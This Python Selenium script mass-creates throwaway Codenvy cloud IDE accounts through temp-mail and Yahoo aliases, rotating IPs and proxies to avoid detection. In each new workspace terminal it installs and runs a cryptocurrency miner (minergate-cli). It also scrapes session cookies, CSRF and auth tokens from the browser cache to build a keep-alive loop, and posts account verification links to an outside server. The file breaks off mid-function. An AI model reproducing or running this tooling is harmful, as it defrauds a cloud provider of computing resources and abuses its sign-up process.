##########################################################################################################################
##########################################################################################################################
######################################### DROP MAIL ####################################################
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.select import Select
import uuid,re,requests
import json
import time 



import subprocess,os

USE_PROXY = 0

def refresh_ip():
    print "-------------------"
    print "   REFRESH IP"
    print "-------------------"
    os.system('taskkill /IM u1603.exe /F')
    subprocess.Popen(["u1603.exe"],stdout=subprocess.PIPE)    
    time.sleep(5)



IP_LOCAL = requests.get('https://api.ipify.org?format=json').json()['ip']

def getPublicIp():
    try:
        print "Check Ip"
        data= requests.get('http://checkip.dyndns.com/').text
        current_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        return 1 if IP_LOCAL == current_ip else 0
    except:
        return 1



def getProxy():
    for i in range(100000):
        try:
            rr = requests.get('https://gimmeproxy.com/api/getProxy',timeout=14 )
            data = rr.json()
            return {'http':'http://'+data['ipPort'], 'https':'http://'+data['ipPort']}
        except:
            pass
    return {}



payload = {
    "Host": "codenvy.io",
    "Connection": "keep-alive",
    "Content-Length": "56",
    "Origin": "https://codenvy.io",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Referer": "https://codenvy.io/site/login?redirect_url=https%3A%2F%2Fcodenvy.io%2F",
    "Accept-Encoding": "gzip,deflate,br",
    "Accept-Language": "en-US,en;q=0.8",
    "Cookie": "JSESSIONID=5822C12A6BE9DEE6172C1661A0576777; session-access-key=n4na8mqW9OyebjDH4iymbnmLDbWyjDnWquLErnqvDz85bfbSmPv9b09na98ib9OjKHXqyv05CLKv1bunP4H11WfTyyb0e4SvDPjzme9jWzS1aTP0vGie9z5rT0KOuC8ezz0uuGinmKGySn9WayzzDTTKj0aeHirOPqrL9GOm8qffOq5485SGGWuCyryye1WS1ey44nvuT8rjabyq895Wn8Tb1vf85iSz0W8CPy9vWD9O5DvDrPOer4T48vrXKHD; logged_in=true; _ga=GA1.2.1473880644.1503166301; _gid=GA1.2.619268484.1503166628; IDESESSIONID=6F37402826CD049C4704D1F5359CB4DE; __utmt=1; __utmt_exo=1; __ar_v4=2TZBGUFB4NG3XOXIT65JNC%3A20170819%3A2%7CZG5Z2TEJUZBPBFFAJOVBWT%3A20170819%3A2%7CBZOLVVOXJVEOFDOIOAFMVC%3A20170819%3A2; __utma=236179731.1473880644.1503166301.1503243268.1503349413.4; __utmb=236179731.6.10.1503349413; __utmc=236179731; __utmz=236179731.1503243268.3.2.utmcsr=github.com|utmccn=(referral)|utmcmd=referral|utmcct=/codenvy/docs/"
}


# driver = webdriver.PhantomJS("C:/Users/HPCOMPAQ/sel/bin/phantomjs")
# driver = webdriver.Firefox()


##### 1 : Get list emails on dropmail.me 

def get_url_token(driver):
    driver.get('https://mytemp.email/2/')
    if USE_PROXY :
        check_secure = 0
        while getPublicIp() :
            check_secure += 1
            time.sleep(4)
            if check_secure > 6 :
                return '',''
    for i in range(24):
        print "attempt insction : ",i
        try:
            time.sleep(3)
            while len(driver.find_elements_by_xpath('//button[@class="md-icon-button md-primary md-button md-ink-ripple"]')) > 0:
                time.sleep(3)
                driver.find_elements_by_xpath('//button[@class="md-icon-button md-primary md-button md-ink-ripple"]')[0].click()
        except :
            pass 
        button_new_email =   driver.find_element_by_xpath('//p[@class="truncate ng-binding"]')
        button_new_email.click()
        time.sleep(3)
        email = driver.find_elements_by_xpath('//span[@class="truncate ng-binding flex"]')[0].text
        rr= requests.post('https://codenvy.io/api/internal/token/validate?redirect_url=https%3A%2F%2Fcodenvy.io%2F',data = json.dumps({'email':email,'username':email.split('@')[0]}) ,headers=payload)    
        if rr.status_code == 200: 
            time.sleep(5)
            trouve=0
            for attend_la in range(5):
                try:
                    if 'codenvy' not in driver.find_elements_by_xpath('//span[@class="truncate hide-sm ng-binding flex-25"]')[0].text :
                        time.sleep(3)
                    else :
                        trouve = 1
                        break
                except :
                    time.sleep(3)
            if not trouve :
                continue 
            try:
                driver.find_elements_by_xpath('//span[@class="truncate hide-sm ng-binding flex-25"]')[0].click()
            except :
                print "here - fqfzef" 
            WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_id('body-html-iframe-content') )
            time.sleep(2) 
            return re.findall('"([^"]+bearertoken[^"]+)"',driver.page_source)[0],email
    return '',''

###############################################
def get_url_token1_unit(driver):
    try :
        driver.get('https://temp-mail.org/en/')
        driver.find_element_by_id("click-to-delete").click()
        time.sleep(3)
        email = driver.find_element_by_id("mail").get_attribute('value')
        rr= requests.post('https://codenvy.io/api/internal/token/validate?redirect_url=https%3A%2F%2Fcodenvy.io%2F',data = json.dumps({'email':email,'username':email.split('@')[0]}) ,headers=payload)    
        print rr.text
        if rr.status_code == 200:  
            for tt in range(5):
                try:
                    time.sleep(5)
                    driver.find_elements_by_xpath('//a[@class="title-subject"]')[0].click() 
                    break
                except : 
                    pass
            time.sleep(5)
            return re.findall('"([^"]+bearertoken[^"]+)"',driver.page_source)[0],email
        else :
            return '',''
    except : 
        return '',''

def get_url_token1(driver):
    for i in range(30):
        print 'attempt : ',i
        url,email = get_url_token1_unit(driver)
        if url and email : 
            return url,email
    return '',''
###############################################
###############################################
###############################################
########    
    
    
####3 : goto inscription page: 
def ls_unit(driver,cmd) :
    try:
        print('--ls-- : refresh')
        driver.refresh()
        print('--ls-- :wait')
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_tag_name("iframe"))
        print('--ls-- : found iframe')
        tt=driver.find_element_by_tag_name("iframe")
        driver.switch_to.frame(tt)
        time.sleep(30)
        print('--ls-- :wait 2')
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]'))
        xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
        time.sleep(1)
        xterm.click()
        time.sleep(1)
        xterm.send_keys(Keys.RETURN)
        cursor = driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]')
        print(' ---- 17')
        cursor.send_keys(cmd)
        print(' ---- 18')
        xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
        print(' ---- 19')
        xterm.send_keys(Keys.RETURN)
        return 1
    except Exception as e:
        print str(e)
        return 0

def wait_find_xpath(driver,cmd,timeout=10,n=6,verbose=0):
    for lhjzei in range(n):
        try:
            obj = driver.find_element_by_xpath(cmd)
            ok=1
            return 1
        except Exception as e:
            time.sleep(10)
            if verbose :
                print str(e)
    return 0


def switch_iframe(driver):
    WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_tag_name("iframe"))
    tt=driver.find_element_by_tag_name("iframe")
    driver.switch_to.frame(tt)



def ls_unit1(driver,cmd) :
    try:
        print('--ls-- : refresh')
        driver.refresh()
        print('--ls-- :wait')
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_tag_name("iframe"))
        print('--ls-- : found iframe')
        time.sleep(10)
        tt=driver.find_element_by_tag_name("iframe")
        driver.switch_to.frame(tt)
        found = wait_find_xpath(driver,'//div[@class="terminal xterm xterm-theme-default"]',verbose=1)
        if not found : return 0
        print '--ls-- pass'
        time.sleep(1)
        xterm.click()
        time.sleep(1)
        xterm.send_keys(Keys.RETURN)
        cursor = driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]')
        print(' ---- 17')
        cursor.send_keys(cmd)
        print(' ---- 18')
        for aa in range(5):
            try:
                xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
                print(' ---- 19')
                xterm.send_keys(Keys.RETURN)
                return 1
            except:
                pass
        return 0
    except Exception as e:
        print str(e)
        return 0

        
def ls(driver,cmd) : 
    for i in range(5):
        if ls_unit1(driver,cmd) : 
            break
    
    
def is_finish_command(driver):
    try:
        ee=driver.find_elements_by_xpath('//div//span[@class="reverse-video terminal-cursor"]')
        text = ee[0].find_element_by_xpath('..').text
    except :
        return 0 
    if '/projects/mmm$' in text :
        return 1
    else :
        return 0

def newTerm1(driver):
    nterm = driver.find_elements_by_xpath('//span[@class="GO-AEOVBMT"]')[0]
    nterm.click()

def newTerm(driver):    
    driver.find_element_by_id('gwt-debug-MenuItem/runGroup-true').click()
    driver.find_element_by_id('topmenu/Run/Terminal').click()


def input_cmd_1(driver):
    cpt=0
    deja=0
    while cpt < 3:
        try:
            print(' -input_cmd_1--- 20')
            WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]'))
            print(' --input_cmd_1-- 21')
            if not deja :
                cursor = driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]')
                print(' ---- 17')
                cursor.send_keys('sudo apt-get update  && sudo apt-get install -y tmux python-pip vim && pip install requests && git clone https://github.com/daipaw0001/mmm && cd mmm')
                print(' ---- 18')
                deja = 1
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            print(' ---- 19')
            xterm.send_keys(Keys.RETURN) 
            
            return 1
        except Exception  as e:
            print str(e)
            cpt += 1
    return 0


def input_cmd_2(driver):
    cpt=0
    while cpt < 3:
        try:
            print(' --input_cmd_2-- 20')
            WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]'))
            print(' --input_cmd_2-- 21')
            cursor = driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]')
            print(' --input_cmd_2-- 22')
            cursor.send_keys('tmux new-session -d "sudo dpkg -i minergate-cli.deb"')
            print(' --input_cmd_2-- 22')
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            xterm.send_keys(Keys.RETURN)
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            xterm.send_keys(Keys.RETURN)
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            xterm.send_keys(Keys.RETURN)            
            return 1
        except:
            cpt += 1
    return 0


def input_cmd_costum(driver,filename):
    cpt=0
    while cpt < 3:
        try:
            print(' ---- 20')
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            time.sleep(1)
            xterm.click()
            time.sleep(1)
            xterm.send_keys(Keys.RETURN)
            cursor = driver.find_element_by_xpath('//span[@class="reverse-video terminal-cursor"]')
            print(' ---- 17')
            cursor.send_keys('tmux new-session -d "python '+filename+'.py"')
            print(' ---- 18')
            xterm = driver.find_element_by_xpath('//div[@class="terminal xterm xterm-theme-default"]')
            print(' ---- 19')
            xterm.send_keys(Keys.RETURN) 
            return 1
        except:
            cpt += 1
    return 0



#### 1 inscription 
#### 2 create workspace


def onpage_1_inscr(driver,url):
    try :
        driver.get(url)
        WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_id("firstName")) 
        print "part1 : 1"
        elem_fill_fn = driver.find_element_by_id("firstName")
        elem_fill_fn.send_keys("firss dftN ame")  
        print "part1 : 2"
        elem_fill_ln = driver.find_element_by_id("lastName")
        elem_fill_ln.send_keys("fir stsd fName")  
        print "part1 : 3"
        elem_fill_comp = driver.find_element_by_id("employer")
        elem_fill_comp.send_keys("fir stdsd fName")   
        print "part1 : 4"
        my_select = Select( driver.find_element_by_id("jobtitle") )
        ok=0
        while ok < 5 :
            try:
                ok += 1
                my_select.select_by_index(1)
                ok = 99
            except:
                time.sleep(2)
                pass
        my_select.select_by_index(1)
        print "part1 : 5"
        my_select = Select( driver.find_element_by_id("country") )
        ok=0
        while ok < 5 :
            try:
                ok += 1
                my_select.select_by_index(1)
                ok = 99
            except:
                time.sleep(2)
                pass
        my_select.select_by_index(1)    
        print "part1 : 6"
        elem_get_start = driver.find_element_by_xpath('//input[@value="Get Started"]')
        elem_get_start.click() 
        print "part1 : 7"
    except :
        return 0
    ######################## WAITING #########################
    # driver.get(driver.current_url + "create-workspace")
    # driver.get("https://codenvy.io/dashboard/#/ide/npojyaoi-01b3/wksp-uq6a")
    try:
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//span[@class="ng-scope"]')) 
        print "part1 : 16"
        driver.get("https://codenvy.io/dashboard/#/create-workspace")
    except :
        return 0
    return 1

def onpage_2_workspace(driver):
    print(' ---- 1')
    WebDriverWait(driver, 50).until(lambda driver: driver.find_element_by_xpath('//button[@md-theme="chesave"]'))
    try:
        time.sleep(2)
        driver.find_element_by_xpath('//img[@ng-src="https://codenvy.io/api/stack/blank-default/icon"]').click() 
        time.sleep(2)
        driver.find_elements_by_xpath('//button[@class="md-button md-default-theme md-ink-ripple"]')[1].click()
        time.sleep(2)
        driver.find_elements_by_xpath('//button[@class="md-button md-default-theme md-ink-ripple"]')[1].click()
    except :
        pass
    print(' ---- 1.1')  
    WebDriverWait(driver, 50).until(lambda driver: driver.find_element_by_xpath('//button[@md-theme="chesave"]').is_enabled() )
    button_create_session = driver.find_element_by_xpath('//button[@md-theme="chesave"]')
    print(' ---- 1.2')
    button_create_session.click() 
    print(' ---- 2')
    WebDriverWait(driver, 50).until(lambda driver: driver.find_element_by_tag_name("iframe"))
    print(' ---- 3')
    is_pret = 0
    for __ in range(14):
        try:
            time.sleep(6)
            if recheck_onpage_2_workspace(driver) : 
                time.sleep(6)
                return 1
            driver.find_element_by_xpath('//span[@class="fa fa-circle workspace-status-running ng-scope"]')
            is_pret = 1
            break
        except Exception as e:
            print str(e)
            pass
    return is_pret

def recheck_onpage_2_workspace(driver):
    try :
        eee = driver.find_elements_by_xpath("//*[contains(text(), ':/projects$')]")[0].text
        if 'user@' in eee:
            return 1
    except:
        pass
    return 0

def onpage_3_cmd(driver):
    try :  
        cmd2 = input_cmd_2(driver)
        print '4 : 1'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('svg_2'))
        print '4 : 2'
        ee0=driver.find_element_by_id('svg_2')
        ee0.click()
        print '4 : 3'
        time.sleep(10)
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('newGroup'))
        print '4 : 4'
        ee1=driver.find_element_by_id('newGroup')
        print '4 : 5'
        ee1.click()
        print '4 : 6'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('toolbar/Python File'))
        print '4 : 7'
        ee2=driver.find_element_by_id('toolbar/Python File')
        print '4 : 8'
        ee2.click()
        print '4 : 9'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('gwt-debug-askValueDialog-textBox'))
        print '4 : 10'
        ee3=driver.find_element_by_id('gwt-debug-askValueDialog-textBox')
        print '4 : 11'
        ee3.send_keys('lqqusdc')
        print '4 : 12'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('askValue-dialog-ok'))
        print '4 : 13'
        ee4=driver.find_element_by_id('askValue-dialog-ok')
        print '4 : 14'
        ee4.click()
        print '4 : 15'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//div[@class="annotationLine currentLine"]'))
        print '4 : 16'
        ee5 = driver.find_elements_by_xpath('//div[@class="annotationLine currentLine"]')
        print '4 : 17'
        ee5[1].click()
        print '4 : 18'
        ee5[1].send_keys('ii')
        print '4 : 19' 
    except :
        return 0
    return 1

def onpage_5_cmd(driver,filename,text):
    try :  
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('svg_2'))
        print '4 : 2'
        ee0=driver.find_element_by_id('svg_2')
        ee0.click()
        print ' : 3'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('newGroup'))
        print '5 : 4'
        ee1=driver.find_element_by_id('newGroup')
        print '5 : 5'
        ee1.click()
        print '5 : 6'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('toolbar/Python File'))
        print '5 : 7'
        ee2=driver.find_element_by_id('toolbar/Python File')
        print '5 : 8'
        ee2.click()
        print '5 : 9'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('gwt-debug-askValueDialog-textBox'))
        print '5 : 10'
        ee3=driver.find_element_by_id('gwt-debug-askValueDialog-textBox')
        print '5 : 11'
        ee3.send_keys(filename)
        print '5 : 12'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('askValue-dialog-ok'))
        print '5 : 13'
        ee4=driver.find_element_by_id('askValue-dialog-ok')
        print '5 : 14'
        ee4.click()
        print '5 : 15'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//div[@class="annotationLine currentLine"]'))
        print '5 : 16'
        time.sleep(10)
        ee5 = driver.find_elements_by_xpath('//div[@class="annotationLine currentLine"]')
        print '5 : 17'
        ee5[-1].is_enabled()
        ee5[-1].click()
        print '5 : 18'
        ee5[-1].send_keys(text)
        # for cc in text :
            # ee5[-1].send_keys(cc)
            # time.sleep(0.1)
        print '5 : 19' 
    except :
        return 0
    return 1



    
def onpage_4_get_payload(driver,jid,refer,crsf,url2,auth):
    cookies = driver.get_cookies()
    for cc in cookies :  
        if cc['name'] == '__utma': 
            utma = str(cc['value'])
        if cc['name'] == '__utmb':
            utmb = str(cc['value'])
        if cc['name'] == '__utmc':
            utmc = str(cc['value'])
        if cc['name'] == '__utmz':
            utmz = str(cc['value'])
        if cc['name'] ==  'session-access-key':
            sak =str(cc['value'])
        if cc['name'] ==  '_ga':
            ga = str(cc['value'])
        if cc['name'] ==  '_gid':
            gid = str(cc['value'])
        if cc['name'] == 'IDESESSIONID':
            iid = str(cc['value'] ) 
    cook2 = 'JSESSIONID='+jid+'; session-access-key='+sak+'; logged_in=true; _ga='+ga+'; _gid='+gid+'; IDESESSIONID='+iid 
    try : 
        cook2 += '; __utma='+utma
    except : 
        pass
    try : 
        cook2 += '; __utmb='+utmb
    except : 
        pass
    try : 
        cook2 += '; __utmc='+utmc
    except : 
        pass
    try : 
        cook2 += '; __utmz='+utmz
    except : 
        pass
    payload2 = {
        "Host": "codenvy.io",
        "Connection": "keep-alive",
        "Content-Length": "0",
        "Origin": "https://codenvy.io",
        "X-Requested-With": "XMLHttpRequest", 
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "en-US,en;q=0.8", 
        "X-CSRF-Token": crsf, 
        "Authorization":auth,
        "Referer": refer,
        'Cookie':cook2
    }
    text  =  'import time,requests\n'
    text +=  'payload2='+json.dumps(payload2)
    text += "\n"
    text += """while 1:\n rr2= requests.put("%s",headers=payload2,data="print 1")\n rr3= requests.get("%s",headers=payload2,data="print 1")\n print rr2\n time.sleep(15)"""%(url2,url2)
    return text


def get_ssh(driver) :
    try :
        driver.find_elements_by_xpath('//span[@class="GO-AEOVBFU"]')[0].click()
        driver.find_elements_by_xpath('//span[@class="GO-AEOVBHU"]')[0].click()
    except :
        zz=driver.find_elements_by_xpath("//*[contains(text(), 'SSH')]")
        for zzz in zz: 
            if 'SSH' in zzz.text:
                zzz.click()
    time.sleep(10)
    sshdoc = ''
    for aa in driver.find_elements_by_tag_name("pre"):
        if aa.text :
            sshdoc = aa.text
    return sshdoc
    


def create_project(driver,pname):
    hong = 0
    while hong < 10 :
        try:
            try:
                driver.find_elements_by_xpath('//div[@class="GO-AEOVBH0B"]')[1].click()
            except :
                try :
                    driver.find_elements_by_xpath('//div[@class="GO-AEOVBLNB"]')[1].click()
                except :
                    zz=driver.find_elements_by_xpath("//*[contains(text(), 'Create Project...')]")
                    zz[0].click()
            time.sleep(2)
            driver.find_element_by_id('gwt-debug-projectWizard-Blank').click()
            time.sleep(2)
            driver.find_element_by_id('gwt-debug-file-newProject-projectName').send_keys(pname)
            time.sleep(2)
            driver.find_element_by_id('projectWizard-saveButton').click()
            hong =99
        except :
            hong += 1
    if hong == 99 :
        return 1
    else :
        return 0

def create_pfile(driver,fname):
    try:
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('svg_2'))
        print '4 : 2'
        ee0=driver.find_element_by_id('svg_2')
        ee0.click()
        print '4 : 3'
        time.sleep(4)
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('newGroup'))
        print '4 : 4'
        ee1=driver.find_element_by_id('newGroup')
        print '4 : 5'
        ee1.click()
        print '4 : 6'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('toolbar/Python File'))
        print '4 : 7'
        ee2=driver.find_element_by_id('toolbar/Python File')
        print '4 : 8'
        ee2.click()
        print '4 : 9'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('gwt-debug-askValueDialog-textBox'))
        print '4 : 10'
        ee3=driver.find_element_by_id('gwt-debug-askValueDialog-textBox')
        print '4 : 11'
        ee3.send_keys(fname)
        print '4 : 12'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_id('askValue-dialog-ok'))
        print '4 : 13'
        ee4=driver.find_element_by_id('askValue-dialog-ok')
        print '4 : 14'
        ee4.click()
        print '4 : 15'
        WebDriverWait(driver, 90).until(lambda driver: driver.find_element_by_xpath('//div[@class="annotationLine currentLine"]'))
        print '4 : 16'
        ee5 = driver.find_elements_by_xpath('//div[@class="annotationLine currentLine"]')
        print '4 : 17'
        ee5[1].click()
        print '4 : 18'
        ee5[1].send_keys('ii')
        print '4 : 19' 
    except :
        return 0
    return 1

def get_header(driver):
    print 'header : 0'
    refer = 'https://codenvy.io/' + re.findall( '#.ide.(.*)$', driver.current_url)[0]
    print 'header : 0001'
    driver.switch_to_window(driver.window_handles[1])
    print 'header : 00002'
    driver.get('about:cache?storage=disk&context=')
    print 'header : 00003'
    time.sleep(3)
    print 'header : 1'
    html = driver.page_source
    url2 =  re.findall('(http.*loulou.py)"',html)[0]
    url3 =  re.findall('(http.*.api.project.item.cao)"',html)[0]
    time.sleep(3)
    print 'header : 2'    
    driver.get('about:cache-entry?storage=disk&context=&eid=&uri=https://codenvy.io/api/permissions/system')
    time.sleep(3)
    print 'header : 3'    
    html = driver.page_source
    crsf =  re.findall('X-CSRF-Token: (.+)\n',html)[0]
    time.sleep(3)
    print 'header : 4'    
    try:
        driver.get('about:cache-entry?storage=disk&context=&eid=&uri=' + url2)
        html = driver.page_source
        time.sleep(3)
        print 'header : 5'    
        auth = re.findall('auth:[^\n]+\n\s+<td>([^\n]+)<\/td>',html)[0]
    except : 
        driver.get('about:cache-entry?storage=disk&context=&eid=&uri=' + url3)
        html = driver.page_source
        time.sleep(3)
        print 'header : 5'    
        auth = re.findall('auth:[^\n]+\n\s+<td>([^\n]+)<\/td>',html)[0]    
    time.sleep(3)
    print 'header : 6'    
    try :
        jid=''
        driver.get('about:cache-entry?storage=disk&context=&eid=&uri=https://codenvy.io/dashboard/')
        time.sleep(4)
        html = driver.page_source
        jid =  re.findall('JSESSIONID=([^;]+);',html)[0] 
        print 'header : 7'
    except:
        try:
            driver.get('https://codenvy.io/dashboard/#/account')
            time.sleep(4)
            print 'header : 7777'
            cooks = driver.get_cookies()
            for cook in cooks : 
                if cook['name'] == 'JSESSIONID':
                    jid = cook['value']
        except :
            pass
    driver.switch_to_window(driver.window_handles[0])
    print 'header : 8'
    text = onpage_4_get_payload(driver,jid,refer,crsf,url2,auth)
    return text

def update_pw(driver,email):
    try:
        driver.switch_to_window(driver.window_handles[1])
        driver.get('https://codenvy.io/dashboard/#/account')
        time.sleep(5)
        driver.find_elements_by_xpath('//md-tab-item[@class="md-tab ng-scope ng-isolate-scope md-ink-ripple"]')[0].click()
        time.sleep(5)
        driver.find_elements_by_xpath('//input[@class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength"]')[0].send_keys('hooldes01')
        driver.find_elements_by_xpath('//input[@class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-custom-validator"]')[0].send_keys('hooldes01')
        driver.find_elements_by_xpath('//button[@class="che-button md-accent md-raised md-hue-2 md-button md-chedefault-theme md-ink-ripple"]')[0].click()
        with open('ok.txt','a') as ff:
            ff.write('\n'+email+'\n')
        driver.switch_to_window(driver.window_handles[0])
    except Exception as e:
        print str(e)


#################YAHOO #####################

def get_email_url(driver):
    flag = 1
    while flag :
        print "111"
        mails = driver.find_elements_by_xpath("//span[@title=\"Verify Your Codenvy Account\"]")
        time.sleep(5)
        flag2= 1
        for mail in mails:
            print "f2222"
            try:
                if 'subject bold' in mail.get_attribute('class'):
                    print "found !"
                    mail.click()
                    url = driver.find_elements_by_xpath("//a[contains(@href, 'bearertoken')]")[0].get_attribute('href')
                    divm = driver.find_elements_by_xpath("//*[contains(text(), 'daipaw_dai_01-')]")
                    email = ''
                    for divm1 in divm: 
                        if divm1.text : 
                            email = divm1.text 
                            break
                    ddd={'email':email,'url':url}
                    print 'ok for : ',email
                    requests.post('https://nguyencao.tk/codenvy/create/',data=ddd)
                    flag2 = 0
                    break
            except Exception as e:
                print str(e)
            print "f3333"
        if flag2 :
            flag = 0
        print "444"
        driver.find_element_by_id('Inbox').click()
        print "5555"

def check_receive_email(driver):
    flag_go = 1
    while flag_go < 30 :
        try :
            mails = driver.find_elements_by_xpath("//span[@title=\"Verify Your Codenvy Account\"]")
            time.sleep(5)
            flag2= 1
            for mail in mails:
                print "f2222"
                try:
                    if 'subject bold' in mail.get_attribute('class'):
                        return 1
                except : 
                    pass
        except : 
            pass
        time.sleep(5)
        flag_go += 1
    return 0

def get_email_url_costum(driver):
    flag = 1
    while flag :
        print "111"
        mails = driver.find_elements_by_xpath("//span[@title=\"Verify Your Codenvy Account\"]")
        time.sleep(5)
        flag2= 1
        for mail in mails:
            print "f2222"
            try:
                if 'subject bold' in mail.get_attribute('class'):
                    print "found !"
                    mail.click()
                    time.sleep(3)
                    url = driver.find_elements_by_xpath("//a[contains(@href, 'bearertoken')]")[0].get_attribute('href')
                    divm = driver.find_elements_by_xpath("//*[contains(text(), 'daipaw_dai_01-')]")
                    email = ''
                    for divm1 in divm: 
                        if divm1.text : 
                            email = divm1.text 
                            break
                    ddd={'email':email,'url':url}
                    print 'ok for : ',email
                    requests.post('https://nguyencao.tk/codenvy/create/',data=ddd)
                    flag2 = 0
                    return url,email
                    break
            except Exception as e:
                print str(e)
            print "f3333"
        if flag2 :
            flag = 0
        print "444"
        driver.find_element_by_id('Inbox').click()
        print "5555"
    return '',''



def click_ok_yh(driver):
    for i in range(15):
        try:
            b_ok = driver.find_elements_by_xpath("//button[@data-action=\"continue\"]")
            for bb in b_ok : 
                if "OK" in bb.text :
                    bb.click()
                    return 1
        except: 
            time.sleep(1)
    return 0


def delete_email(driver):
    cks = driver.find_elements_by_xpath("//input[@type=\"checkbox\"]")
    for ck in cks:
        if 'Select or deselect all messages' in ck.get_attribute('title'):
            ck.click()
            driver.find_element_by_id('btn-delete').click()
            time.sleep(7)
            driver.find_element_by_id('okModalOverlay').click()
            return 1
    return 0


def click_save_yh(driver):
    for i in range(65):
        print i
        try:
            b_save = driver.find_elements_by_xpath("//button[@class=\"left right default btn\"]")
            for bb in b_save : 
                if re.findall('save',bb.text,flags=2) :
                    bb.click()
                    b_save1 = driver.find_elements_by_xpath("//button[@class=\"left right default btn\"]")
                    if len(b_save1) != len(b_save) : 
                        return 1
        except Exception as e: 
            print str(e)
            time.sleep(4)
        time.sleep(4)
    return 0

def remove_email(driver):
    isEmail = 1
    while isEmail : 
        tag_mail = driver.find_elements_by_xpath("//*[contains(text(), 'daipaw_dai_01-')]")
        if not tag_mail : 
            isEmail = 0
        flag1 = 1
        for  m in tag_mail  : 
            try:
                if 'daipaw_dai_01-' in  m.text :
                    flag1= 0
                    m.click()
                    driver.find_element_by_id('options-remove-addr').click()
                    ### click OK:
                    click_ok_yh(driver)
            except : 
                pass
        if flag1 : 
            isEmail = 0


def add_email(driver,n1,n2):
    for im in range(n1,n2):
        driver.find_element_by_id('options-add-addr').click()
        driver.find_elements_by_xpath("//input[@name=\"keyword\"]")[0].send_keys(str(im))
        click_save_yh(driver)
        time.sleep(3)
    for i in range(n1,n2):
        email = 'daipaw_dai_01-'+str(i)+'@yahoo.com'
        rr= requests.post('https://codenvy.io/api/internal/token/validate?redirect_url=https%3A%2F%2Fcodenvy.io%2F',data = json.dumps({'email':email,'username':str(uuid.uuid4())[:18].replace('-','')}) ,headers=payload)    
    click_save_yh(driver)

def signup_envy(email):
    for toiti in range(30):
        try :
            proxy = getProxy()
            if proxy:
                rr = requests.post('https://codenvy.io/api/internal/token/validate?redirect_url=https%3A%2F%2Fcodenvy.io%2F',data = json.dumps({'email':email,'username':str(uuid.uuid4())[:18].replace('-','')}) ,headers=payload,proxies=proxy)
            else :
                rr = requests.post('https://codenvy.io/api/internal/token/validate?redirect_url=https%3A%2F%2Fcodenvy.io%2F',data = json.dumps({'email':email,'username':str(uuid.uuid4())[:18].replace('-','')}) ,headers=payload)
            return rr
        except : 
            pass
    return 0

def add_email_costum(driver):
    try:
        id = str(uuid.uuid4())[:10].replace('-','')
        driver.find_element_by_id('options-add-addr').click()
        driver.find_elements_by_xpath("//input[@name=\"keyword\"]")[0].send_keys(id)
        __ = click_save_yh(driver)
        print "Click Save : ",__
        time.sleep(3)
        email = 'daipaw_dai_01-'+id+'@yahoo.com'
        print 'email : ',email
        print signup_envy(email)
        __ = click_save_yh(driver)
        print "Click Save 2 : ",__
        return 1
    except Exception as e: 
        print "Error in add_email_costum : ",str(e)
        return 0

def enable_setting(driver):
    try:
        try:
            try:
                driver.find_element_by_id('yucs-help_button').click()
